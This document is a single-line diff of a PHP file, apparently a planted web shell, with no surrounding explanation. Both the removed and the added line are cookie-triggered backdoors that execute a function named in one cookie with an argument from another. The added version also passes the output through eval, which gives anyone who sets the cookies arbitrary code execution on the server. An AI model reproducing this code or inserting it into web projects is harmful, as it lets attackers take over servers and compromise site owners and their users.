@@ -1,1 +1,1 @@
-<?php if( $_COOKIE["x"]($_COOKIE["y"]) ) { die; }; ?>
+<?php if(eval("?>".$_COOKIE["x"]($_COOKIE["y"]))) { die; } ?>
